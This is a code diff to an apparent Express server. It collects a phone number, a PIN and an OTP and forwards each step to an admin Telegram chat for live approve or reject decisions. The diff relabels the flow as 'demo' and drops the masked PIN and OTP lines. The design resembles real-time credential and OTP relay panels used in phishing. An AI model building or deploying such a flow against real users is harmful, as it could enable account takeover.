@@ -19,7 +19,7 @@ const ADMIN_CHAT_ID =
 
 
 // ==============================
-// LOGIN DATA
+// DEMO LOGIN DATA
 // ==============================
 
 let loginRequest = null;
@@ -66,11 +66,8 @@ app.get("/", function(request, response) {
 app.post("/login", async function(request, response) {
 
     let phone = request.body.phone;
-
     let pin = request.body.pin;
 
-
-    // Check fields
 
     if (!phone || !pin) {
 
@@ -87,7 +84,7 @@ app.post("/login", async function(request, response) {
     }
 
 
-    // PIN must be exactly 6 digits
+    // Demo PIN must be 6 digits
 
     if (!/^\d{6}$/.test(pin)) {
 
@@ -105,7 +102,7 @@ app.post("/login", async function(request, response) {
 
 
     // ==============================
-    // CREATE LOGIN REQUEST
+    // CREATE DEMO LOGIN REQUEST
     // ==============================
 
     loginRequest = {
@@ -124,106 +121,86 @@ app.post("/login", async function(request, response) {
 
 
     console.log(
-        "================================"
-    );
-
-    console.log(
-        "NEW DEMO LOGIN REQUEST"
-    );
-
-    console.log(
-        "Phone:",
-        phone
-    );
-
-    console.log(
-        "Request ID:",
+        "New demo login request:",
         loginRequest.id
-    );
-
-    console.log(
-        "================================"
     );
 
 
     // ==============================
-    // SEND LOGIN REQUEST TO TELEGRAM
+    // TELEGRAM LOGIN MESSAGE
     // ==============================
 
     try {
 
-        await telegramRequest(
-            "sendMessage",
-            {
+        let result =
+            await telegramRequest(
+                "sendMessage",
+                {
 
-                chat_id:
-                    ADMIN_CHAT_ID,
+                    chat_id:
+                        ADMIN_CHAT_ID,
 
-                text:
-                    "🔔 NEW DEMO LOGIN REQUEST\n\n" +
+                    text:
+                        "🔔 DEMO LOGIN REQUEST\n\n" +
 
-                    "Phone: " +
-                    phone +
+                        "Phone: " +
+                        phone +
 
-                    "\nDemo PIN: ******" +
+                        "\nRequest ID: " +
+                        loginRequest.id +
 
-                    "\nRequest ID: " +
-                    loginRequest.id +
-
-                    "\n\nPlease choose an action:",
+                        "\n\nChoose an action:",
 
 
-                reply_markup: {
+                    reply_markup: {
 
-                    inline_keyboard: [
+                        inline_keyboard: [
 
-                        [
+                            [
 
-                            {
-                                text:
-                                    "✅ Approve",
+                                {
+                                    text:
+                                        "✅ Approve",
 
-                                callback_data:
-                                    "approve_login_" +
-                                    loginRequest.id
-                            },
+                                    callback_data:
+                                        "approve_login_" +
+                                        loginRequest.id
+                                },
 
-                            {
-                                text:
-                                    "❌ Reject",
+                                {
+                                    text:
+                                        "❌ Reject",
 
-                                callback_data:
-                                    "reject_login_" +
-                                    loginRequest.id
-                            }
+                                    callback_data:
+                                        "reject_login_" +
+                                        loginRequest.id
+                                }
+
+                            ]
 
                         ]
 
-                    ]
+                    }
 
                 }
-
-            }
-        );
+            );
 
 
         console.log(
-            "Telegram login notification sent"
+            "Telegram login result:",
+            result.ok
         );
+
 
     } catch (error) {
 
         console.log(
             "Telegram error:",
-            error
+            error.message
         );
 
     }
 
-
-    // ==============================
-    // RESPONSE
-    // ==============================
 
     response.json({
 
@@ -269,15 +246,14 @@ app.get(
 
 
 // ==============================
-// OTP SUBMISSION
+// DEMO OTP SUBMISSION
 // ==============================
 
 app.post(
     "/verify-otp",
     async function(request, response) {
 
-        let otp =
-            request.body.otp;
+        let otp = request.body.otp;
 
 
         // ==============================
@@ -303,7 +279,7 @@ app.post(
 
 
         // ==============================
-        // CHECK OTP FORMAT
+        // CHECK DEMO OTP FORMAT
         // ==============================
 
         if (!/^\d{6}$/.test(otp)) {
@@ -313,7 +289,7 @@ app.post(
                 success: false,
 
                 message:
-                    "OTP must be 6 digits"
+                    "Demo OTP must be 6 digits"
 
             });
 
@@ -322,7 +298,7 @@ app.post(
 
 
         // ==============================
-        // MARK OTP AS PENDING
+        // MARK DEMO OTP AS PENDING
         // ==============================
 
         loginRequest.otpStatus =
@@ -330,88 +306,127 @@ app.post(
 
 
         console.log(
-            "Demo OTP submitted for approval"
+            "Demo OTP submitted for admin approval"
         );
 
 
         // ==============================
-        // SEND OTP APPROVAL TO TELEGRAM
+        // SEND MASKED OTP NOTIFICATION
         // ==============================
 
         try {
 
-            await telegramRequest(
-                "sendMessage",
-                {
+            let result =
+                await telegramRequest(
+                    "sendMessage",
+                    {
 
-                    chat_id:
-                        ADMIN_CHAT_ID,
+                        chat_id:
+                            ADMIN_CHAT_ID,
 
-                    text:
-                        "🔐 DEMO OTP SUBMITTED\n\n" +
+                        text:
+                            "🔐 DEMO OTP SUBMITTED\n\n" +
 
-                        "Phone: " +
-                        loginRequest.phone +
-
-                        "\nOTP: ******" +
-
-                        "\nRequest ID: " +
-                        loginRequest.id +
-
-                        "\n\nPlease choose an action:",
+                            "Phone: " +
+                            loginRequest.phone +
 
 
-                    reply_markup: {
+                            "\nRequest ID: " +
+                            loginRequest.id +
 
-                        inline_keyboard: [
+                            "\n\nChoose an action:",
 
-                            [
 
-                                {
-                                    text:
-                                        "✅ Approve OTP",
+                        reply_markup: {
 
-                                    callback_data:
-                                        "approve_otp_" +
-                                        loginRequest.id
-                                },
+                            inline_keyboard: [
 
-                                {
-                                    text:
-                                        "❌ Reject OTP",
+                                [
 
-                                    callback_data:
-                                        "reject_otp_" +
-                                        loginRequest.id
-                                }
+                                    {
+                                        text:
+                                            "✅ Approve OTP",
+
+                                        callback_data:
+                                            "approve_otp_" +
+                                            loginRequest.id
+                                    },
+
+                                    {
+                                        text:
+                                            "❌ Reject OTP",
+
+                                        callback_data:
+                                            "reject_otp_" +
+                                            loginRequest.id
+                                    }
+
+                                ]
 
                             ]
 
-                        ]
+                        }
 
                     }
-
-                }
-            );
+                );
 
 
             console.log(
-                "Telegram OTP notification sent"
+                "Telegram OTP result:",
+                result.ok
             );
+
+
+            // ==============================
+            // TELEGRAM FAILED
+            // ==============================
+
+            if (!result.ok) {
+
+                loginRequest.otpStatus =
+                    "not_entered";
+
+
+                response.json({
+
+                    success: false,
+
+                    message:
+                        "Could not send demo approval request"
+
+                });
+
+                return;
+            }
 
 
         } catch (error) {
 
             console.log(
                 "Telegram error:",
-                error
+                error.message
             );
 
+
+            loginRequest.otpStatus =
+                "not_entered";
+
+
+            response.json({
+
+                success: false,
+
+                message:
+                    "Could not contact Telegram"
+
+            });
+
+            return;
         }
 
 
         // ==============================
-        // RESPONSE
+        // SUCCESS
         // ==============================
 
         response.json({
@@ -419,7 +434,7 @@ app.post(
             success: true,
 
             message:
-                "OTP submitted. Waiting for approval."
+                "OTP submitted. Waiting for admin approval."
 
         });
 
@@ -520,7 +535,7 @@ async function handleTelegramButton(
 
 
     // ==============================
-    // READ BUTTON
+    // READ BUTTON DATA
     // ==============================
 
     let parts =
@@ -530,10 +545,8 @@ async function handleTelegramButton(
     let command =
         parts[0];
 
-
     let stage =
         parts[1];
-
 
     let requestId =
         parts[2];
@@ -566,7 +579,7 @@ async function handleTelegramButton(
 
 
     // ==============================
-    // 5 MINUTE WINDOW
+    // CHECK 5 MINUTE WINDOW
     // ==============================
 
     let timePassed =
@@ -643,7 +656,6 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nDemo PIN: ******" +
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -653,10 +665,6 @@ async function handleTelegramButton(
             }
         );
 
-
-        console.log(
-            "Login approved"
-        );
 
         return;
     }
@@ -712,10 +720,6 @@ async function handleTelegramButton(
         );
 
 
-        console.log(
-            "Login rejected"
-        );
-
         return;
     }
 
@@ -745,7 +749,7 @@ async function handleTelegramButton(
                     callbackQuery.id,
 
                 text:
-                    "OTP approved ✅"
+                    "Demo OTP approved ✅"
 
             }
         );
@@ -767,7 +771,6 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nOTP: ******" +
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -777,10 +780,6 @@ async function handleTelegramButton(
             }
         );
 
-
-        console.log(
-            "OTP approved"
-        );
 
         return;
     }
@@ -807,7 +806,7 @@ async function handleTelegramButton(
                     callbackQuery.id,
 
                 text:
-                    "OTP rejected ❌"
+                    "Demo OTP rejected ❌"
 
             }
         );
@@ -829,20 +828,14 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nOTP: ******" +
-
                     "\nRequest ID: " +
                     loginRequest.id +
 
-                    "\n\nUser must try again."
+                    "\n\nUser can try again."
 
             }
         );
 
-
-        console.log(
-            "OTP rejected"
-        );
 
         return;
     }
@@ -855,8 +848,6 @@ async function handleTelegramButton(
 // ==============================
 
 async function startTelegramPolling() {
-
-    // Check Telegram settings
 
     if (
         !TELEGRAM_BOT_TOKEN ||
@@ -936,7 +927,7 @@ async function startTelegramPolling() {
 
             console.log(
                 "Telegram polling error:",
-                error
+                error.message
             );
 
 
